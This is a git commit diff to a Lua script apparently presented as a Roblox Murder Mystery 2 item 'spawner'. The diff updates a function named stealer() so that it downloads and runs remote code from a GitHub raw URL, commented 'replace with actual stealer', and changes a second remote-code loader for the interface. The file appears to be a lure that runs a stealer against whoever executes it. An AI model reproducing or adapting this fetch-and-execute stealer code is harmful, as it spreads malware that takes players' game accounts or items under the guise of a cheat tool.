0132e6448873be8b459c087c106255a72c58e870
TakZ-bit <tak72086@gmail.com>
2025-10-02 14:41:36 +0630

    Update Mm2SpwanerFixed.lua

--- Mm2SpwanerFixed.lua
+++ Mm2SpwanerFixed.lua
@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet('https://pastebin.com/raw/ZvehLyZ9'))() -- replace with actual stealer
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TakZ-bit/improved-potato/refs/heads/main/S.lua'))() -- replace with actual stealer
 end
 local function loadui()
-  loadstring(game:HttpGet("https://pastebin.com/raw/Q8NWfbXc"))()
+  loadstring(game:HttpGet("https://pastebin.com/raw/8aKZarZX"))()
 
 end
 
